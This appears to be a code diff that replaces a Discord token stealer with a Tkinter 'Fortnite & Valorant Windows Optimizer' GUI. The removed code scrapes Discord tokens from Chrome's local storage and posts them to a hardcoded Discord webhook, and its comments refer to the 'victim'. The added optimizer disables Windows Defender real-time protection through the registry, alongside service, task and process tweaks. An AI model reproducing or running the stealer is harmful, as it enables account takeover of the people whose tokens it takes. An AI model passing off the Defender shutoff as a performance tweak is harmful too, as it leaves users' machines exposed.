@@ -1,145 +1,297 @@
-# ruff: noqa: INP001
-import base64
-import json
+import webbrowser
 import os
-import re
-import urllib.request
-from pathlib import Path
+import shutil
+import subprocess
+import ctypes
+import psutil
+import winreg
+import threading
+import tkinter as tk
+from tkinter import scrolledtext
 
-TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
-REQUEST_HEADERS = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
-}
-WEBHOOK_URL = "https://discord.com/api/webhooks/1388546819574988820/G8Crpd_eI3fCMwsMbWTMjl1V1WfMmiBrIUL7c4IY5ocrQfSQ44y9CYGF87tu-FKI4avp"
+# === Your contact info ===
+MAKER_NAME = "YUNG"
+YOUTUBE_URL = "https://youtube.com/yourchannel"   # Replace with your YouTube link
+DISCORD_URL = "https://discord.gg/yourdiscord"    # Replace with your Discord invite link
+TELEGRAM_URL = "https://t.me/yourtelegram"        # Replace with your Telegram link
 
+def open_url(url):
+    webbrowser.open_new(url)
 
-def make_post_request(api_url: str, data: dict[str, str]) -> int:
-    if not api_url.startswith(("http", "https")):
-        raise ValueError
+# === Optimization functions ===
 
-    request = urllib.request.Request(  # noqa: S310
-        api_url, data=json.dumps(data).encode(),
-        headers=REQUEST_HEADERS,
-    )
+def log_print(text):
+    gui_log.config(state='normal')
+    gui_log.insert(tk.END, text + '\n')
+    gui_log.see(tk.END)
+    gui_log.config(state='disabled')
 
-    with urllib.request.urlopen(request) as response:  # noqa: S310
-        return response.status
-
-
-def get_tokens_from_file(file_path: Path) -> list[str] | None:
-
+def clear_temp():
+    temp_path = os.getenv('TEMP')
     try:
-        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
-    except PermissionError:
-        return None
+        for filename in os.listdir(temp_path):
+            file_path = os.path.join(temp_path, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception:
+                pass
+        log_print("[✔] Temporary files cleared.")
+    except Exception as e:
+        log_print(f"[!] Failed to clear temp files: {e}")
 
-    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
-
-    return tokens or None
-
-
-def get_user_id_from_token(token: str) -> str | None:
-    """Confirm that the portion of a string before the first dot can be decoded.
-
-    Decoding from base64 offers a useful, though not infallible, method for identifying
-    potential Discord tokens. This is informed by the fact that the initial
-    segment of a Discord token usually encodes the user ID in base64. However,
-    this test is not guaranteed to be 100% accurate in every case.
-
-    Returns
-    -------
-        A string representing the Discord user ID to which the token belongs,
-        if the first part of the token can be successfully decoded. Otherwise,
-        None.
-
-    """
+def clear_recycle_bin():
     try:
-        discord_user_id = base64.b64decode(
-            token.split(".", maxsplit=1)[0] + "==",
-        ).decode("utf-8")
-    except UnicodeDecodeError:
-        return None
+        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x0007)
+        log_print("[✔] Recycle Bin emptied.")
+    except Exception as e:
+        log_print(f"[!] Failed to empty Recycle Bin: {e}")
 
-    return discord_user_id
+def optimize_timer_resolution():
+    class TimerResolution:
+        def __init__(self):
+            self.winmm = ctypes.WinDLL('winmm')
+            self.current_resolution = 0
+        def set_resolution(self, ms):
+            res = self.winmm.timeBeginPeriod(ms)
+            if res == 0:
+                self.current_resolution = ms
+                log_print(f"[✔] Timer resolution set to {ms} ms.")
+            else:
+                log_print("[✘] Failed to set timer resolution.")
+    timer = TimerResolution()
+    timer.set_resolution(1)
 
+def apply_network_tweaks():
+    log_print("[~] Applying network tweaks for low ping...")
+    try:
+        subprocess.run('netsh interface tcp set global congestionprovider=ctcp', shell=True, stdout=subprocess.DEVNULL)
+        subprocess.run('netsh interface tcp set global autotuninglevel=highlyrestricted', shell=True, stdout=subprocess.DEVNULL)
+        subprocess.run('netsh interface tcp set global rss=enabled', shell=True, stdout=subprocess.DEVNULL)
+        log_print("[✔] Network tweaks applied.")
+    except Exception as e:
+        log_print(f"[!] Failed to apply network tweaks: {e}")
 
-def get_tokens_from_path(base_path: Path) -> dict[str, set]:
-    """Collect discord tokens for each user ID.
+def disable_defender_real_time_protection():
+    log_print("[~] Disabling Windows Defender Real-Time Protection...")
+    try:
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
+                               r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
+        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        log_print("[✔] Defender Real-Time Protection disabled (restart required).")
+    except Exception as e:
+        log_print(f"[!] Failed to disable Defender real-time protection: {e}")
 
-    to manage the occurrence of both valid and expired Discord tokens, which happens when a
-    user updates their password, triggering a change in their token. Lacking
-    the capability to differentiate between valid and expired tokens without
-    making queries to the Discord API, the function compiles every discovered
-    token into the returned set. It is designed for these tokens to be
-    validated later, in a process separate from the initial collection and not
-    on the victim's machine.
+def disable_visual_effects():
+    log_print("[~] Disabling unnecessary visual effects for performance...")
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "VisualFXSetting", 0, winreg.REG_DWORD, 2)  # Adjust for best performance
+        winreg.CloseKey(key)
+        log_print("[✔] Visual effects adjusted.")
+    except Exception as e:
+        log_print(f"[!] Failed to disable visual effects: {e}")
 
-    Returns
-    -------
-        user id mapped to a set of potential tokens
+def disable_prefetch_superfetch():
+    log_print("[~] Disabling Prefetch and Superfetch...")
+    try:
+        key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "EnablePrefetcher", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(key, "EnableSuperfetch", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        log_print("[✔] Prefetch and Superfetch disabled.")
+    except Exception as e:
+        log_print(f"[!] Failed to disable Prefetch/Superfetch: {e}")
 
-    """
-    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+def set_gpu_priority_high():
+    log_print("[~] Setting GPU hardware scheduling to high priority...")
+    try:
+        key_path = r"SYSTEM\CurrentControlSet\Control\GraphicsDrivers"
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+        winreg.SetValueEx(key, "HwSchMode", 0, winreg.REG_DWORD, 2)  # High priority mode
+        winreg.CloseKey(key)
+        log_print("[✔] GPU priority set high (restart required).")
+    except Exception as e:
+        log_print(f"[!] Failed to set GPU priority: {e}")
 
-    id_to_tokens: dict[str, set] = {}
+def set_power_plan_ultimate_performance():
+    log_print("[~] Setting Ultimate Performance power plan...")
+    try:
+        subprocess.run("powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61", shell=True, stdout=subprocess.DEVNULL)
+        subprocess.run("powercfg -setactive e9a42b02-d5df-448d-aa00-03f14749eb61", shell=True)
+        log_print("[✔] Ultimate Performance power plan set.")
+    except Exception as e:
+        log_print(f"[!] Failed to set power plan: {e}")
 
-    for file_path in file_paths:
-        potential_tokens = get_tokens_from_file(file_path)
+def disable_service(service_name):
+    try:
+        subprocess.run(f"sc stop {service_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(f"sc config {service_name} start= disabled", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log_print(f"[✔] Service {service_name} stopped and disabled.")
+    except Exception as e:
+        log_print(f"[!] Could not disable service {service_name}: {e}")
 
-        if potential_tokens is None:
-            continue
+services_to_disable = [
+    "SysMain",
+    "WSearch",
+    "DiagTrack",
+    "WMPNetworkSvc",
+    "XblGameSave",
+    "XboxNetApiSvc",
+    "MapsBroker",
+    "CDPUserSvc",
+]
 
-        for potential_token in potential_tokens:
-            discord_user_id = get_user_id_from_token(potential_token)
+scheduled_tasks_to_disable = [
+    r"\Microsoft\Windows\Application Experience\ProgramDataUpdater",
+    r"\Microsoft\Windows\Autochk\Proxy",
+    r"\Microsoft\Windows\Customer Experience Improvement Program\Consolidator",
+    r"\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip",
+    r"\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector",
+    r"\Microsoft\Windows\Maintenance\WinSAT",
+]
 
-            if discord_user_id is None:
-                continue
+def disable_scheduled_tasks(tasks):
+    for task in tasks:
+        try:
+            subprocess.run(f'schtasks /Change /TN "{task}" /Disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            log_print(f"[✔] Disabled scheduled task: {task}")
+        except Exception as e:
+            log_print(f"[!] Could not disable scheduled task {task}: {e}")
 
-            if discord_user_id not in id_to_tokens:
-                id_to_tokens[discord_user_id] = set()
+processes_to_kill = [
+    "OneDrive.exe",
+    "Spotify.exe",
+    "Cortana.exe",
+    "MicrosoftEdge.exe",
+    "SearchUI.exe",
+    "RuntimeBroker.exe",
+    "LockApp.exe",
+    "ShellExperienceHost.exe",
+]
 
-            id_to_tokens[discord_user_id].add(potential_token)
+def kill_unnecessary_processes():
+    for proc in psutil.process_iter(['name']):
+        try:
+            if proc.info['name'] in processes_to_kill:
+                proc.kill()
+                log_print(f"[✔] Killed process: {proc.info['name']}")
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            pass
 
-    return id_to_tokens or None
+def reduce_cpu_overhead():
+    log_print("[~] Reducing unnecessary CPU processes and services...")
+    for svc in services_to_disable:
+        disable_service(svc)
+    disable_scheduled_tasks(scheduled_tasks_to_disable)
+    kill_unnecessary_processes()
+    log_print("[✔] CPU overhead reduction complete.")
 
+def disable_xbox_features():
+    log_print("[~] Disabling Xbox Game Bar and Game DVR...")
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR")
+        winreg.SetValueEx(key, "AppCaptureEnabled", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(key, "GameDVR_Enabled", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
 
-def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]],
-) -> int:
-    """Caution: In scenarios where the victim has logged into multiple Discord
-    accounts or has frequently changed their password, the accumulation of
-    tokens may result in a message that surpasses the character limit,
-    preventing it from being sent. There are no plans to introduce code
-    modifications to segment the message for compliance with character
-    constraints.
-    """  # noqa: D205
-    fields: list[dict] = []
+        disable_service("XblGameSave")
+        disable_service("XboxNetApiSvc")
 
-    for user_id, tokens in user_id_to_token.items():
-        fields.append({
-            "name": user_id,
-            "value": "\n".join(tokens),
-        })
+        log_print("[✔] Xbox Game Bar and Game DVR disabled.")
+    except Exception as e:
+        log_print(f"[!] Failed to disable Xbox features: {e}")
 
-    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
+def disable_fullscreen_optimizations():
+    log_print("[~] Disabling fullscreen optimizations system-wide...")
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"System\GameConfigStore")
+        winreg.SetValueEx(key, "GameDVR_FSEBehaviorMode", 0, winreg.REG_DWORD, 2)
+        winreg.CloseKey(key)
 
-    make_post_request(webhook_url, data)
+        key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR")
+        winreg.SetValueEx(key2, "AppCaptureEnabled", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(key2, "GameDVR_Enabled", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key2)
+        log_print("[✔] Fullscreen optimizations disabled.")
+    except Exception as e:
+        log_print(f"[!] Failed to disable fullscreen optimizations: {e}")
 
+def disable_mouse_acceleration():
+    log_print("[~] Disabling mouse acceleration...")
+    try:
+        SPI_SETMOUSE = 0x0071
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETMOUSE, 0, (0, 0, 0, 0), 0)
+        log_print("[✔] Mouse acceleration disabled.")
+    except Exception as e:
+        log_print(f"[!] Failed to disable mouse acceleration: {e}")
 
-def main() -> None:
+# === Main function to apply all tweaks ===
 
-    chrome_path = (
-        Path(os.getenv("LOCALAPPDATA")) /
-        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
-    )
-    tokens = get_tokens_from_path(chrome_path)
+def apply_all_tweaks():
+    log_print("=== Starting Fortnite & Valorant Optimizations ===")
+    clear_temp()
+    clear_recycle_bin()
+    optimize_timer_resolution()
+    apply_network_tweaks()
+    disable_defender_real_time_protection()
+    disable_visual_effects()
+    disable_prefetch_superfetch()
+    set_gpu_priority_high()
+    set_power_plan_ultimate_performance()
+    disable_xbox_features()
+    disable_fullscreen_optimizations()
+    disable_mouse_acceleration()
+    reduce_cpu_overhead()
+    log_print("\n[!] Done applying all tweaks. Please restart your PC for changes to take effect.")
 
-    if tokens is None:
-        return
+# === GUI setup ===
 
-    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+def run_optimization_thread():
+    thread = threading.Thread(target=apply_all_tweaks)
+    thread.start()
 
+root = tk.Tk()
+root.title("Fortnite & Valorant Windows Optimizer")
+root.geometry("700x530")
+root.resizable(False, False)
+root.configure(bg="#121212")  # Black background
 
-if __name__ == "__main__":
-    main()
+frame = tk.Frame(root, bg="#121212")
+frame.pack(pady=5, padx=10, fill=tk.BOTH, expand=False)
+
+# Info section at top
+info_frame = tk.Frame(frame, bg="#121212")
+info_frame.pack(fill=tk.X, pady=(0,10))
+
+maker_label = tk.Label(info_frame, text=f"Maker: {MAKER_NAME}", font=("Arial", 12, "bold"), fg="#BB86FC", bg="#121212")
+maker_label.pack(side=tk.LEFT)
+
+def make_link(label_text, url):
+    link = tk.Label(info_frame, text=label_text, fg="#BB86FC", cursor="hand2", font=("Arial", 12, "underline"), bg="#121212")
+    link.pack(side=tk.LEFT, padx=10)
+    link.bind("<Button-1>", lambda e: open_url(url))
+    return link
+
+yt_link = make_link("YouTube", YOUTUBE_URL)
+discord_link = make_link("Discord", DISCORD_URL)
+telegram_link = make_link("Telegram", TELEGRAM_URL)
+
+# Main frame for button and log
+main_frame = tk.Frame(root, bg="#121212")
+main_frame.pack(padx=10, pady=(0,10), fill=tk.BOTH, expand=True)
+
+btn_run = tk.Button(main_frame, text="Apply All Optimizations", command=run_optimization_thread,
+                    bg="#BB86FC", fg="#121212", font=("Arial", 14, "bold"), activebackground="#9a63d9", activeforeground="#121212",
+                    relief=tk.FLAT)
+btn_run.pack(fill=tk.X, pady=(0,10))
+
+gui_log = scrolledtext.ScrolledText(main_frame, state='disabled', font=("Consolas", 10), bg="#1E1E1E", fg="#E0E0E0", insertbackground="white")
+gui_log.pack(fill=tk.BOTH, expand=True)
+
+root.mainloop()
